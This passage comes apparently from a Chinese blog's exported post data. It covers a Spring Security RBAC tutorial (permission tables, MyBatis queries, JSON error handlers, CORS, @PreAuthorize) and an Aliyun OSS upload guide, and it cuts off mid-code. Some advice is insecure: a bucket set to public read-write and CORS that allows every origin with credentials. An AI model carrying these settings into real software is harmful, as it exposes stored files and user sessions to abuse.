utf8mb4 COMMENT ='用户信息表'; -- 创建权限表 DROP TABLE IF EXISTS `sys_menu`; CREATE TABLE `sys_menu` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `menu_name` varchar(64) NOT NULL DEFAULT 'NULL' COMMENT '菜单名', `path` varchar(200) DEFAULT NULL COMMENT '路由地址', `component` varchar(255) DEFAULT NULL COMMENT '组件路径', `visible` char(1) DEFAULT '0' COMMENT '菜单状态（0显示 1隐藏）', `status` char(1) DEFAULT '0' COMMENT '菜单状态（0正常 1停用）', `perms` varchar(100) DEFAULT NULL COMMENT '权限标识', `icon` varchar(100) DEFAULT '#' COMMENT '菜单图标', `create_by` bigint(20) DEFAULT NULL, `create_time` datetime DEFAULT NULL, `update_by` bigint(20) DEFAULT NULL, `update_time` datetime DEFAULT NULL, `deleted` int(11) DEFAULT '0' COMMENT '删除标志（0代表未删除 1代表已删除）', `remark` varchar(500) DEFAULT NULL COMMENT '备注', PRIMARY KEY (`id`) ) ENGINE = InnoDB AUTO_INCREMENT = 2 DEFAULT CHARSET = utf8mb4 COMMENT ='菜单表'; -- 创建角色表 DROP TABLE IF EXISTS `sys_role`; CREATE TABLE `sys_role` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `name` varchar(128) DEFAULT NULL, `role_key` varchar(100) DEFAULT NULL COMMENT '角色权限字符串', `status` char(1) DEFAULT '0' COMMENT '角色状态（0正常 1停用）', `del_flag` int(1) DEFAULT '0' COMMENT 'del_flag', `create_by` bigint(200) DEFAULT NULL, `create_time` datetime DEFAULT NULL, `update_by` bigint(200) DEFAULT NULL, `update_time` datetime DEFAULT NULL, `remark` varchar(500) DEFAULT NULL COMMENT '备注', PRIMARY KEY (`id`) ) ENGINE = InnoDB AUTO_INCREMENT = 3 DEFAULT CHARSET = utf8mb4 COMMENT ='角色表'; -- 创建角色权限中间表 DROP TABLE IF EXISTS `sys_role_menu`; CREATE TABLE `sys_role_menu` ( `role_id` bigint(200) NOT NULL AUTO_INCREMENT COMMENT '角色ID', `menu_id` bigint(200) NOT NULL DEFAULT '0' COMMENT '菜单id', PRIMARY KEY (`role_id`, `menu_id`) ) ENGINE = InnoDB AUTO_INCREMENT = 2 DEFAULT CHARSET = utf8mb4 COMMENT ='角色权限中间表'; -- 创建用户角色中间表 DROP TABLE IF EXISTS `sys_user_role`; CREATE TABLE `sys_user_role` ( `user_id` bigint(200) NOT NULL AUTO_INCREMENT COMMENT '用户id', `role_id` bigint(200) NOT NULL DEFAULT '0' COMMENT '角色id', PRIMARY KEY (`user_id`, `role_id`) ) ENGINE = InnoDB DEFAULT CHARSET = utf8mb4 COMMENT ='用户角色中间表'; 实现 实现思路：新建一个 sys_menu 的实体类、Mapper 接口、xml 编写查询用户权限的 SQL 放在 xml 中，Mapper 中声明对应的方法 Mapper 传入的参数类型需要和 实体类中的 userId 兼容 生成 xml 文件和自定义 SQL 可在类上合方法上进行提示填充（MybatisX 插件） 最后把我们写死的权限换成查询的（Mapper 的 bean 要注入） //Set&lt;String&gt; permissions = new HashSet&lt;String&gt;(Arrays.asList(\"system:user:list\")); var permissions = sysMenuMapper.selectPermsByUserId(user.getUserId()); return new LoginUser(user, permissions); 点击显/隐代码块(实体类) package com.adalucky.modules.system.model.entity; import com.baomidou.mybatisplus.annotation.FieldFill; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableField; import com.baomidou.mybatisplus.annotation.TableId; import com.baomidou.mybatisplus.annotation.TableName; import java.io.Serializable; import java.time.LocalDateTime; import io.swagger.annotations.ApiModel; import io.swagger.annotations.ApiModelProperty; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; /** * @author ada * @Version JDK17 * @Description 菜单表 实体类 * @since 2022-04-26 00:06:11 */ @Data @AllArgsConstructor @NoArgsConstructor @TableName(\"sys_menu\") @ApiModel(value = \"SysMenu对象\", description = \"菜单表\") public class SysMenu implements Serializable { private static final long serialVersionUID = 1L; @TableId(value = \"id\", type = IdType.AUTO) private Long id; @ApiModelProperty(\"菜单名\") private String menuName; @ApiModelProperty(\"路由地址\") private String path; @ApiModelProperty(\"组件路径\") private String component; @ApiModelProperty(\"菜单状态（0显示 1隐藏）\") private String visible; @ApiModelProperty(\"菜单状态（0正常 1停用）\") private String status; @ApiModelProperty(\"权限标识\") private String perms; @ApiModelProperty(\"菜单图标\") private String icon; private Long createBy; @TableField(fill = FieldFill.INSERT) private LocalDateTime createTime; private Long updateBy; @TableField(fill = FieldFill.INSERT_UPDATE) private LocalDateTime updateTime; @ApiModelProperty(\"删除标志（0代表未删除 1代表已删除）\") private Integer deleted; @ApiModelProperty(\"备注\") private String remark; } 点击显/隐代码块(Mapper接口) package com.adalucky.modules.system.mapper; import com.adalucky.modules.system.model.entity.SysMenu; import com.baomidou.mybatisplus.core.mapper.BaseMapper; import org.apache.ibatis.annotations.Mapper; import java.util.Set; /** * @author ada * @Version JDK17 * @Description 菜单表 Mapper 接口 * @since 2022-04-26 00:06:11 */ @Mapper public interface SysMenuMapper extends BaseMapper&lt;SysMenu&gt; { Set&lt;String&gt; selectPermsByUserId(Integer id); } 点击显/隐代码块(xml) &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\"&gt; &lt;mapper namespace=\"com.adalucky.modules.system.mapper.SysMenuMapper\"&gt; &lt;select id=\"selectPermsByUserId\" resultType=\"java.lang.String\"&gt; SELECT DISTINCT M.perms FROM `sys_user_role` UR LEFT JOIN `sys_role` R ON UR.role_id = R.id LEFT JOIN `sys_role_menu` RM ON UR.role_id = RM.role_id LEFT JOIN `sys_menu` M ON RM.menu_id = M.id WHERE UR.user_id = #{id} AND M.`status` = '0' AND R.`status` = '0' &lt;/select&gt; &lt;/mapper&gt; 异常处理简介 我们还希望在认证失败或者是授权失败的情况下也能和我们的接口一样返回相同结构的json，这样可以让前端能对响应进行统一的处理。要实现这个功能我们需要知道SpringSecurity的异常处理机制。 在SpringSecurity中，如果我们在认证或者授权的过程中出现了异常会被ExceptionTranslationFilter捕获到。在ExceptionTranslationFilter中会去判断是认证失败还是授权失败出现的异常。 如果是认证过程中出现的异常会被封装成AuthenticationException然后调用AuthenticationEntryPoint对象的方法去进行异常处理。 如果是授权过程中出现的异常会被封装成AccessDeniedException然后调用AccessDeniedHandle对象的方法去进行异常处理。 所以如果我们需要自定义异常处理，我们只需要自定义AuthenticationEntryPoint和AccessDeniedHandler然后配置给SpringSecurity即可。 自定义实现 需要重写两个实现类 注意如果有全局异常处理，并且捕获的异常类型为 Exception 或者包含了下面实现类抛出的异常，全局的异常捕获会覆盖掉当前的自定义，给你的感觉就像是没有生效 记得要注入到容器 package com.adalucky.handler; import com.adalucky.response.Result; import com.adalucky.utils.web.WebUtils; import com.alibaba.fastjson.JSON; import org.springframework.http.HttpStatus; import org.springframework.security.core.AuthenticationException; import org.springframework.security.web.AuthenticationEntryPoint; import org.springframework.stereotype.Component; import javax.servlet.ServletException; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; /** * @author ada * @Version JDK17 * @Description 自定义用户认证失败异常 * @since 2022/4/27 21:37 */ @Component public class AuthenticationEntryPointImpl implements AuthenticationEntryPoint { @Override public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException, ServletException { var result = Result.error(false, HttpStatus.UNAUTHORIZED.value(), \"用户认证失败,请重新登录\"); String json = JSON.toJSONString(result); //处理异常 WebUtils.renderString(response, json); } } package com.adalucky.handler; import com.adalucky.response.Result; import com.adalucky.utils.web.WebUtils; import com.alibaba.fastjson.JSON; import org.springframework.http.HttpStatus; import org.springframework.security.access.AccessDeniedException; import org.springframework.security.web.access.AccessDeniedHandler; import org.springframework.stereotype.Component; import javax.servlet.ServletException; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; /** * @author ada * @Version JDK17 * @Description 自定义权限认证失败异常 * @since 2022/4/27 21:40 */ @Component public class AccessDeniedHandlerImpl implements AccessDeniedHandler { @Override public void handle(HttpServletRequest request, HttpServletResponse response, AccessDeniedException accessDeniedException) throws IOException, ServletException { var result = Result.error(false, HttpStatus.FORBIDDEN.value(), \"您的权限不足,请联系管理员开通权限\"); String json = JSON.toJSONString(result); //处理异常 WebUtils.renderString(response, json); } } 配置类 在之前的配置类中加入配置容器中要注入接口 AuthenticationEntryPoint AccessDeniedHandler 然后调用 http.exceptionHandling() 下对应的配置项 package com.adalucky.auth; import com.adalucky.filter.JwtAuthenticationTokenFilter; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.security.authentication.AuthenticationManager; import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity; import org.springframework.security.config.annotation.web.builders.HttpSecurity; import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter; import org.springframework.security.config.http.SessionCreationPolicy; import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder; import org.springframework.security.crypto.password.PasswordEncoder; import org.springframework.security.web.AuthenticationEntryPoint; import org.springframework.security.web.access.AccessDeniedHandler; import org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter; /** * @author ada * @Version JDK17 * @Description SpringBoot Security自动配置类 * @since 2022/3/7 21:37 */ @Configuration @EnableGlobalMethodSecurity(prePostEnabled = true) public class WebSecurityConfig extends WebSecurityConfigurerAdapter { final JwtAuthenticationTokenFilter jwtAuthenticationTokenFilter; private final AuthenticationEntryPoint authenticationEntryPoint; private final AccessDeniedHandler accessDeniedHandler; public WebSecurityConfig(JwtAuthenticationTokenFilter jwtAuthenticationTokenFilter, AuthenticationEntryPoint authenticationEntryPoint, AccessDeniedHandler accessDeniedHandler) { this.jwtAuthenticationTokenFilter = jwtAuthenticationTokenFilter; this.authenticationEntryPoint = authenticationEntryPoint; this.accessDeniedHandler = accessDeniedHandler; } @Bean public PasswordEncoder passwordEncoder() { //创建 CryptPasswordEncoder 注入到容器中，让 Spring Sercurity 默认以该方式进行加密 return new BCryptPasswordEncoder(); } @Bean @Override public AuthenticationManager authenticationManagerBean() throws Exception { //重写这个认证方法，返回父类的认证方法，也就是逻辑还是原来的逻辑，目的是为了注入到 bean 后我们可以在登录的时候去调用这个对象的认证方法 return super.authenticationManagerBean(); } @Override protected void configure(HttpSecurity http) throws Exception { http //关闭csrf .csrf().disable() //不通过Session获取SecurityContext .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS) .and() //开始设置请求认证规则 .authorizeRequests() //对于登录接口、注册接口 允许匿名访问 .antMatchers(\"/user/login\", \"/user/register\").anonymous() //其它的请求，任意用户认证通过后都可访问 .anyRequest().authenticated(); //在UsernamePasswordAuthenticationFilter 过滤器前添加我们的自己写的 JWT 认证过滤器 http.addFilterBefore(jwtAuthenticationTokenFilter, UsernamePasswordAuthenticationFilter.class); //配置异常处理器 http.exceptionHandling() //配置认证失败、授权失败处理器 .authenticationEntryPoint(authenticationEntryPoint) .accessDeniedHandler(accessDeniedHandler); } } 跨域简介 浏览器出于安全的考虑，使用 XMLHttpRequest对象发起 HTTP请求时必须遵守同源策略，否则就是跨域的HTTP请求，默认情况下是被禁止的。 同源策略要求源相同才能正常进行通信，即协议、域名、端口号都完全一致。 前后端分离项目，前端项目和后端项目一般都不是同源的，所以肯定会存在跨域请求的问题。 所以我们就要处理一下，让前端能进行跨域请求。 总体分两步：①配置 SpringBoot 的跨域策略 ②Security 配置开启允许跨域(由于我们的资源都会收到Spring Security的保护，所以想要跨域访问还要让Spring Security允许跨域访问。) SpringBoot跨域配置 当前我的版本为 SpringBoot 2.6.4 package com.adalucky.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.cors.CorsConfiguration; import org.springframework.web.cors.UrlBasedCorsConfigurationSource; import org.springframework.web.filter.CorsFilter; /** * @author ada * @Version JDK17 * @Description 新跨域配置方案不然 SpringBoot2.6.x 访问会有一些报错 * @since 2022/3/19 19:34 */ @Configuration public class CrosConfig { private CorsConfiguration corsConfig() { CorsConfiguration corsConfiguration = new CorsConfiguration(); corsConfiguration.addAllowedOriginPattern(\"*\"); corsConfiguration.addAllowedHeader(\"*\"); corsConfiguration.addAllowedMethod(\"*\"); corsConfiguration.setAllowCredentials(true); corsConfiguration.setMaxAge(3600L); return corsConfiguration; } @Bean public CorsFilter corsFilter() { UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(); source.registerCorsConfiguration(\"/**\", corsConfig()); return new CorsFilter(source); } } Spring Security跨域开启 实际发现我上面的配置以后这里不开启也是能跨域的，估计和版本以及我上面注入了那个 Bean //允许跨域 http.cors(); 其它权限认证方式简介 在上面我们想认证一个用户是否有接口的访问权限，我们的方式是在入Spring Security 的配置类上添加一个注解 @EnableGlobalMethodSecurity(prePostEnabled = true) 然后在接口上添加注解@PreAuthorize(\"hasAuthority('你的权限关键字')\") 来进行实现的，这里的本质是一种 SPEL 的表达式 我们前面都是使用@PreAuthorize注解，然后在在其中使用的是hasAuthority方法进行校验。SpringSecurity还为我们提供了其它方法例如：hasAnyAuthority，hasRole，hasAnyRole等。 可以通过 DEBUG 去理解hasAuthority的原理，hasAuthority方法实际是执行到了SecurityExpressionRoot的hasAuthority，大家只要断点调试既可知道它内部的校验原理。 它内部其实是调用authentication的getAuthorities方法获取用户的权限列表。然后判断我们存入的方法参数数据在权限列表中。 hasAuthority 还是最好用的 hasAnyAuthority hasAnyAuthority方法可以传入多个权限，只有用户有其中任意一个权限都可以访问对应资源 @PreAuthorize(\"hasAnyAuthority('admin','test','system:dept:list')\") public String hello(){ return \"hello\"; } hasRole hasRole 要求有对应的角色才可以访问，但是它内部会把我们传入的参数拼接上 ROLE_ 后再去比较。所以这种情况下要用用户对应的权限也要有 ROLE_ 这个前缀才可以。 也就是说如果使用这个方法做权限校验，那么在我们数据库存储的权限标识符 system:dept:list –&gt; ROLE_system:dept:list @PreAuthorize(\"hasRole('system:dept:list')\") public String hello(){ return \"hello\"; } hasAnyRole hasAnyRole 有任意的角色就可以访问。它内部也会把我们传入的参数拼接上 ROLE_ 后再去比较。所以这种情况下要用用户对应的权限也要有 ROLE_ 这个前缀才可以。 @PreAuthorize(\"hasAnyRole('admin','system:dept:list')\") public String hello(){ return \"hello\"; } 自定义认证方法思路 上面的原理就是在@PreAuthorize注解中加入 Spring Security自带的认证方法，然后传入一个或者多个参数 那么我们也可以定义自己的权限校验方法，在@PreAuthorize注解中使用我们的方法 方法实现 Component 需要起一个别名，到时候获取这个 Bean 的时候就通过这个别名来引用 这个里面只是一个简单的示例，可以以把 集合是否包含换成模糊匹配最终返回一个布尔值，比如接口中定义调用的时候传入的是 system:* 那么就表示 这个用户有 sytem 下的所有权限（大概就是这种，有可能会用到，我这里暂时不涉及就不实现了） @Component(\"automation\") public class ExpressionRoot { public boolean hasAuthority(String authority){ //获取当前用户的权限 Authentication authentication = SecurityContextHolder.getContext().getAuthentication(); LoginUser loginUser = (LoginUser) authentication.getPrincipal(); Set&lt;String&gt; permissions = loginUser.getPermissions(); //判断用户权限集合中是否存在authority return permissions.contains(authority); } } 引用 在SPEL表达式中使用 @automation 相当于获取容器中bean的名字为 automation 的对象。然后再调用这个对象的hasAuthority方法 @RequestMapping(\"/hello\") @PreAuthorize(\"@automation.hasAuthority('system:dept:list')\") public String hello(){ return \"hello\"; } 配置文件认证 上面我们都是通过注解来实现，之前也提到过认证一般有两种，一种是注解，一种是配置，配置一般用于对静态文件，但是也可以对接口进行这样的权限认证 示例如下，这里可以把所有需要权限校验的接口都配上，看个人喜好，可以在这里全配上或者在接口加注解 http.authorizeRequests().antMatchers(\"/user/list\").hasAuthority(\"system:user:list\"); 其它CSRF CSRF是指跨站请求伪造（Cross-site request forgery），是web常见的攻击之一 SpringSecurity去防止CSRF攻击的方式就是通过csrf_token。后端会生成一个csrf_token，前端发起请求的时候需要携带这个csrf_token,后端会有过滤器进行校验，如果没有携带或者是伪造的就不允许访问。 我们可以发现CSRF攻击依靠的是cookie中所携带的认证信息。但是在前后端分离的项目中我们的认证信息其实是token，而token并不是存储中cookie中，并且需要前端代码去把token设置到请求头中才可以，所以CSRF攻击也就不用担心了。所以我们就关掉了，因为我们请求的时候也没带 csrf_token 不关闭反而认证不通过 自定义处理器 以下的这些方案的前是不采用我们上面哪一套设计方案，因为我们上面那一套方案重新了很多过滤器的方法，调用的和默认的不一样，所以在这里可能就无效了，没有去执行父类的 super 默认配置项 认证成功处理器 实际上在UsernamePasswordAuthenticationFilter进行登录认证的时候，如果登录成功了是会调用AuthenticationSuccessHandler的方法进行认证成功后的处理的。AuthenticationSuccessHandler就是登录成功处理器。 我们也可以自己去自定义成功处理器进行成功后的相应处理。 @Component public class SGSuccessHandler implements AuthenticationSuccessHandler { @Override public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { System.out.println(\"认证成功了\"); } } @Configuration public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private AuthenticationSuccessHandler successHandler; @Override protected void configure(HttpSecurity http) throws Exception { http.formLogin().successHandler(successHandler); http.authorizeRequests().anyRequest().authenticated(); } } 认证失败处理器 实际上在UsernamePasswordAuthenticationFilter进行登录认证的时候，如果认证失败了是会调用AuthenticationFailureHandler的方法进行认证失败后的处理的。AuthenticationFailureHandler就是登录失败处理器。 我们也可以自己去自定义失败处理器进行失败后的相应处理。 @Component public class SGFailureHandler implements AuthenticationFailureHandler { @Override public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException { System.out.println(\"认证失败了\"); } } @Configuration public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private AuthenticationSuccessHandler successHandler; @Autowired private AuthenticationFailureHandler failureHandler; @Override protected void configure(HttpSecurity http) throws Exception { http.formLogin() // 配置认证成功处理器 .successHandler(successHandler) // 配置认证失败处理器 .failureHandler(failureHandler); http.authorizeRequests().anyRequest().authenticated(); } } 登出成功处理器@Component public class SGLogoutSuccessHandler implements LogoutSuccessHandler { @Override public void onLogoutSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException, ServletException { System.out.println(\"注销成功\"); } } @Configuration public class SecurityConfig extends WebSecurityConfigurerAdapter { @Autowired private AuthenticationSuccessHandler successHandler; @Autowired private AuthenticationFailureHandler failureHandler; @Autowired private LogoutSuccessHandler logoutSuccessHandler; @Override protected void configure(HttpSecurity http) throws Exception { http.formLogin() // 配置认证成功处理器 .successHandler(successHandler) // 配置认证失败处理器 .failureHandler(failureHandler); http.logout() //配置注销成功处理器 .logoutSuccessHandler(logoutSuccessHandler); http.authorizeRequests().anyRequest().authenticated(); } }","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"RBAC","slug":"RBAC","permalink":"https://www.adalucky.com/tags/RBAC/"},{"name":"Spring Security","slug":"Spring-Security","permalink":"https://www.adalucky.com/tags/Spring-Security/"},{"name":"JWT","slug":"JWT","permalink":"https://www.adalucky.com/tags/JWT/"}],"author":"Ada"},{"title":"aliOss","slug":"Auto/OSS","date":"2022-03-29T04:36:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/oss/","link":"","permalink":"https://www.adalucky.com/auto/oss/","excerpt":"阿里云对象存储OSS（Object Storage Service）是一款海量、安全、低成本、高可靠的云存储服务，可提供99.9999999999%（12个9）的数据持久性，99.995%的数据可用性。多种存储类型供选择，全面优化存储成本。","text":"阿里云对象存储OSS（Object Storage Service）是一款海量、安全、低成本、高可靠的云存储服务，可提供99.9999999999%（12个9）的数据持久性，99.995%的数据可用性。多种存储类型供选择，全面优化存储成本。 参考资料 阿里 OSS简介 阿里云对象存储OSS（Object Storage Service）为您提供基于网络的数据存取服务。使用OSS，您可以通过网络随时存储和调用包括文本、图片、音视频在内的各类数据文件 创建Bucket，并将文件上传至Bucket。上传完成后，将文件（Object）下载至本地或者通过生成签名URL的方式将文件分享给第三方，供其下载或预览 入口 登录阿里云控制台 【产品】-【存储】-【对象存储 OSS】 开通 OSS 价格 当前截图时价格，我主要是做一些头像照片的存储，可以选低频的，一个月估计不会到 1 个 G，8 分钱就能解决 前置准备创建 Bucket 地域：这里建议选择和自己服务器节点近的地域 存储类型：选择低频访问（便宜点，这个根据实际情况，如果访问量比较大的话还是选标准） 同城冗余存储：不开通要收钱,OSS 将您的数据以冗余的方式存储在同一区域（Region）的 3 个可用区（Zone）中。提供机房级容灾能力，能提高您的数据可用性 版本控制：选择不开通，这个是针对需要回滚的才选择开通，需要额外收费（我们这里涉及不到） 读写权限尽量选择公共读写 上传体验 在刚才的Bucket 下新建一个目录用于存放图片（为资源归类） 权限控制 Access Key:阿里系下有非常多的产品,所有产品的控制权限通过主账户Access Key进行控制,该账户可以访问所有的产品 RAM:RAM可以有多个，可单独为RAM配置拥有的产品控制权限,基于安全考虑我们用 RAM 创建用户组 通过 RAM 入口进入，创建用户组，然后给用户组分配权限，最后再创建用户给用户分配用户组 用户组分配权限 给刚才创建的用户组指定可以对阿里云的那些产品进行权限控制，这里就用我们的 OSS 相关内容 创建用户 刚才已经准备好了用户组，现在需要准备用一个用户，然后把用户的权限指定为刚才的用户组，这样该用户就拥有了 OSS 相关的权限了 创建后记得下载 CSV 文件保存好账户信息 分配用户组 这一步的目的是将用户绑定到之前的用户组里面，这样用户就能使用用户组的权限了（也可直接单独给用户分配权限，这里不做记录了，我个人还是推荐以用户组进行维护） 基础配置导入依赖 导入的版本根据官方给的文档进行导入，最好不要私自修改任意版本号 我尝试的把 sdk 升级到最新的后面 做 Bucket 空间判断的时候有返回错误（可能是版本于其它地方有不匹配的） Gradle导入：implementation(\"com.aliyun.oss:aliyun-sdk-oss:3.10.2\") 如果使用的是Java 9及以上的版本，则需要添加jaxb相关依赖 implementation(\"javax.xml.bind:jaxb-api:2.3.1\") implementation(\"javax.activation:activation:1.1.1\") implementation(\"org.glassfish.jaxb:jaxb-runtime:2.3.3\") 配置 yml 将我们刚才创建用户的 key 配置进来 # 阿里 OSS 配置 # 阿里 OSS 配置 alioss: endpoint: yourEndpoint accessKeyId: yourAccessKeyId accessKeySecret: yourAccessKeySecret bucketName: yourBucketName url: https://${alioss.bucketName}.${alioss.endpoint}/ 创建实体 将配置文件中的内容读取到实体中 ConfigurationProperties 用于读取 yml 配置文件 prefix = “alioss” 用于指定前置 实体中的属性名需要和 yml 中保持一致 package com.adalucky.utils.alioss.entity; import lombok.Data; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.stereotype.Component; /** * @author ada * @Version JDK17 * @Description 读取 阿里 OSS 的配置到实体中 * @since 2022/4/9 13:13 */ @ConfigurationProperties(prefix = \"alioss\") @Component @Data public class OssEntity { private String endpoint; private String accessKeyId; private String accessKeySecret; private String bucketName; private String url; } 验证 创建一个单元测试类，验证一下实体对象有没有把 yml 中的值赋值到属性上 有可能单元测试读取不到 yml 配置文件，我是直接再单元测试中新建了一个 application.yml 和 main 下面的内容一致 package com.adalucky.utils.alioss; import com.adalucky.utils.alioss.entity.OssEntity; import org.junit.jupiter.api.Test; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; @SpringBootTest class OssEntityTest { @Autowired OssEntity ossEntity; @Test void ossEntity() { System.out.println(ossEntity); } } AIP 控制 参考阿里官方的 OSS 开发手册,里面有非常详细的示例和说明 接口中定义方法，实现类具体实现 实现类需要加上 @Service 注解 实现类也实现了 InitializingBean，实现 afterPropertiesSet 方法，创建这个 Bean 后对参数进行赋值方便后面统一使用 创建 Bucketpackage com.adalucky.utils.alioss.service.impl; import com.adalucky.handler.BusinessException; import com.adalucky.response.Result; import com.adalucky.response.ResultCode; import com.adalucky.utils.alioss.entity.OssEntity; import com.adalucky.utils.alioss.service.OssService; import com.adalucky.utils.logger.Slf4j; import com.aliyun.oss.OSS; import com.aliyun.oss.OSSClientBuilder; import com.aliyun.oss.model.CreateBucketRequest; import com.aliyun.oss.model.StorageClass; import org.springframework.beans.factory.InitializingBean; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import org.springframework.web.multipart.MultipartFile; /** * @author ada * @Version JDK17 * @Description * @since 2022/4/9 15:11 */ @Service(\"OssServiceImpl\") public class OssServiceImpl implements OssService, InitializingBean { @Autowired OssEntity ossEntity; private String endpoint; private String accessKeyId; private String accessKeySecret; private String bucketName; private String url; /** * 实现 InitializingBean 的方法，在创建初始化 Ali0ssServiceImpl 对象后需要做的事 * * @throws Exception */ @Override public void afterPropertiesSet() throws Exception { endpoint = ossEntity.getEndpoint(); accessKeyId = ossEntity.getAccessKeyId(); accessKeySecret = ossEntity.getAccessKeySecret(); bucketName = ossEntity.getBucketName(); url = ossEntity.getUrl(); } /** * 创建 Bucket 存储空间 * * @return */ @Override public Result createBucket() { // 创建OSSClient实例。 OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret); // 判断存储空间bucket是否存在。如果返回值为true，则存储空间存在，如果返回值为false，则存储空间不存在。 if (ossClient.doesBucketExist(bucketName)) { Slf4j.log().error(\"Bucket【\" + bucketName + \"】已存在,无法重复创建\"); throw new BusinessException( ResultCode.BUCKET_ALREADY_EXIST.getCode(), ResultCode.BUCKET_ALREADY_EXIST.getMessage() ); } else { //设置为低频后-&gt;创建-&gt;关闭-&gt;返回 ok CreateBucketRequest createBucketRequest = new CreateBucketRequest(bucketName); createBucketRequest.setStorageClass(StorageClass.IA); ossClient.createBucket(createBucketRequest); ossClient.shutdown(); return Result.ok().data(\"bucketName\", bucketName).data(\"StorageClass\",StorageClass.IA); } } } 上传文件配置 上传文件的时候有大小限制需要调整一下，不然SpringBoot默认的是单个文件 1MB，整体是 10MB # 上传文件大小限制：单个 50MB 整体 100MB spring: servlet: multipart: max-file-size: 50MB max-request-size: 100MB 实现类 OssService 接口中先定义方法 实现类 url 用于返回给前端 url 是在 yml 中变量组合起来的 url: https://${alioss.bucketName}.${alioss.endpoint}/ package com.adalucky.utils.alioss.service.impl; import com.adalucky.handler.BusinessException; import com.adalucky.response.Result; import com.adalucky.response.ResultCode; import com.adalucky.utils.alioss.entity.OssEntity; import com.adalucky.utils.alioss.service.OssService; import com.adalucky.utils.logger.Slf4j; import com.aliyun.oss.OSS; import com.aliyun.oss.OSSClientBuilder; import com.aliyun.oss.model.CreateBucketRequest; import com.aliyun.oss.model.StorageClass; import org.springframework.beans.factory.InitializingBean; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import org.springframework.web.multipart.MultipartFile; import java.io.IOException; /** * @author ada * @Version JDK17 * @Description * @since 2022/4/9 15:11 */ @Service(\"OssServiceImpl\") public class OssServiceImpl implements OssService, InitializingBean { @Autowired OssEntity ossEntity; private String endpoint; private String accessKeyId; private String accessKeySecret; private String bucketName; private String url; /** * 实现 InitializingBean 的方法，在创建初始化 Ali0ssServiceImpl 对象后需要做的事 * * @throws Exception */ @Override public void afterPropertiesSet() throws Exception { endpoint = ossEntity.getEndpoint(); accessKeyId = ossEntity.getAccessKeyId(); accessKeySecret = ossEntity.getAccessKeySecret(); bucketName = ossEntity.getBucketName(); url = ossEntity.getUrl(); } /** * 上传文件 * * @param file 上传的文件对象 * @return */ @Override public Result upload(MultipartFile file) { String objectName = setObjectName(file); // 创建OSSClient实例。 OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret); try { //上传文件 ossClient.putObject(bucketName, objectName, file.getInputStream()); } catch (IOException e) { Slf4j.log().error(\"上传的文件流获取异常\"); e.printStackTrace(); } finally { if (ossClient != null) { ossClient.shutdown(); } } return Result.ok().message(\"上传成功\").data(\"url\", url+objectName); } String setObjectName(MultipartFile file) { String[] split = file.getContentType().split(\"/\"); String directory = split[0]; return directory + \"/\" + file.getOriginalFilename(); } } Controller 前端控制器 package com.adalucky.utils.alioss.controller; import com.adalucky.response.Result; import com.adalucky.utils.alioss.service.OssService; import io.swagger.annotations.Api; import io.swagger.annotations.ApiOperation; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.springframework.web.multipart.MultipartFile; /** * @author ada * @Version JDK17 * @Description OSS 前端控制器 * @since 2022/4/9 20:46 */ @RestController @RequestMapping(\"/oss\") @Api(tags = \"OSS\") public class OssController { @Autowired OssService ossService; @ApiOperation(value = \"上传文件\", notes = \"上传文件到阿里云 OSS 上\") @PostMapping(\"/upload\") Result upload(MultipartFile file) { return ossService.upload(file); } } 图片无法预览 针对上面上传的图片无法进行预览，每次访问连接都是下载图片，主要有两种方式进行解决：①绑定一个自己的域名 ②上传的时候指定文件的类型 Content-Type 这里为了方便直接绑定了自己的域名（如果没有域名的只能用第二种方式了） 点击显/隐代码块(方式二核心示例) //如果想要实现图片预览的效果,一定要设置以下几点 1.设置文件的ACL(权限) 要么是公共读,要么是公共读写 2.一定要设置文本类型(image/jpg) ObjectMetadata objectMetadata = new ObjectMetadata(); //设置公共读权限 objectMetadata.setObjectAcl(CannedAccessControlList.PublicRead); //设置文件类型 objectMetadata.setContentType(getcontentType(fileType)); //put到 Bucket ossClient.putObject(bucketName, fileName, inputStream, objectMetadata); /** * Description: 判断OSS服务文件上传时文件的contentType * * @param FilenameExtension 文件后缀 * @return String */ public static String getcontentType(String FilenameExtension) { if (FilenameExtension.equalsIgnoreCase(\".bmp\")) { return \"image/bmp\"; } if 